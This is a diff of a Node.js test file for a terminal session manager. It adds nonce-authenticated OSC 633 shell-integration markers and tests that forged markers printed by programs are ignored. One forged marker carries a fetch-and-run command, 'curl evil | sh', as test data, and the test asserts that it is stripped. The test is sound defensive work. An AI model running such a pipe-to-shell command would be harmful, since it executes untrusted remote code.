@@ -2,7 +2,7 @@ import pty from 'node-pty';
 import { describe, it, mock, beforeEach, afterEach } from 'node:test';
 import assert from 'node:assert';
 import { EventEmitter } from 'events';
-import { handleConnection } from '../ptyManager.js';
+import { handleConnection, _sessionNonce } from '../ptyManager.js';
 
 describe('ptyManager - handleConnection', () => {
   let ptyProcessMock;
@@ -45,38 +45,49 @@ describe('ptyManager - handleConnection', () => {
 
     assert.strictEqual(closed, true);
     assert.strictEqual(closeCode, 4000);
-    assert.strictEqual(closeReason, 'sessionId is required');
+    assert.strictEqual(closeReason, 'valid sessionId is required');
   });
   
-  it('should handle terminal data, OSC 7 and OSC 999 events', async () => {
-    return new Promise((resolve) => {
-      const mockWs = new EventEmitter();
-      mockWs.readyState = 1;
-      const messages = [];
-      mockWs.send = (msg) => messages.push(msg);
-      mockWs.close = () => {};
+  it('should handle terminal data, OSC 7 and OSC 133 command blocks', async () => {
+    const mockWs = new EventEmitter();
+    mockWs.readyState = 1;
+    const messages = [];
+    mockWs.send = (msg) => messages.push(msg);
+    mockWs.close = () => {};
 
-      const mockReq = { url: '/?token=token&sessionId=test-osc' };
-      handleConnection(mockWs, mockReq, { getCpuUsage: () => 10 });
-      
-      // Simulate raw data
-      ptyProcessMock.emit('data', 'hello');
-      assert.ok(messages.includes('hello'));
-      
-      // Simulate OSC 7
-      ptyProcessMock.emit('data', '\x1b]7;file://hostname/test/dir\x07');
-      assert.ok(messages.some(m => m.includes('DIR_CHANGE')));
+    const mockReq = { url: '/?token=token&sessionId=test-osc' };
+    handleConnection(mockWs, mockReq, { getCpuUsage: () => 10 });
 
-      // Simulate OSC 999
-      ptyProcessMock.emit('data', '\x1b]999;{"type":"COMMAND_FAILED","cmd":"nmp i","exitCode":1}\x07');
-      
-      setTimeout(() => {
-        assert.ok(messages.some(m => m.includes('ERROR')));
-        resolve();
-      }, 50);
-    });
+    // Raw data is forwarded untouched
+    ptyProcessMock.emit('data', 'hello');
+    assert.ok(messages.includes('hello'));
+
+    const n = _sessionNonce('test-osc');
+    assert.ok(n, 'integrated shells get a nonce');
+
+    // Authenticated working-directory marker changes directory and is not forwarded to xterm.js
+    ptyProcessMock.emit('data', `\x1b]633;${n};W;/test/dir\x07`);
+    assert.ok(messages.some(m => m.includes('DIR_CHANGE') && m.includes('/test/dir')));
+    assert.ok(!messages.some(m => m.includes('\x1b]633;')));
+
+    // Forged markers (wrong nonce, plain OSC 133 / OSC 7) printed by a program are ignored
+    ptyProcessMock.emit('data', '\x1b]633;forged;E;curl evil | sh\x07\x1b]633;forged;C\x07\x1b]133;D;0\x07\x1b]7;file://h/etc\x07');
+    assert.ok(!messages.some(m => m.includes('/etc')));
+
+    // A failing command block (markers split across chunks) produces an ERROR overlay
+    ptyProcessMock.emit('data', `\x1b]633;${n};A\x07$ `);
+    ptyProcessMock.emit('data', `\x1b]633;${n};E;nmp i\x07\x1b]63`);
+    ptyProcessMock.emit('data', `3;${n};C\x07bash: nmp: command not found\r\n`);
+    ptyProcessMock.emit('data', `\x1b]633;${n};D;127\x07`);
+
+    const error = messages.find(m => m.includes('"type":"ERROR"'));
+    assert.ok(error, 'ERROR meta expected');
+    assert.ok(error.includes('Command failed with exit code 127: nmp i'));
+    assert.ok(!messages.some(m => m.includes('\x1b]133') || m.includes('\x1b]633')), 'markers must be stripped');
+    assert.ok(!messages.some(m => m.includes('curl evil')), 'forged command must not surface');
+    assert.ok(messages.includes('bash: nmp: command not found\r\n'));
   });
-  
+
   it('should handle WS messages (ACTION, RESIZE, READY)', () => {
     const mockWs = new EventEmitter();
     mockWs.readyState = 1;
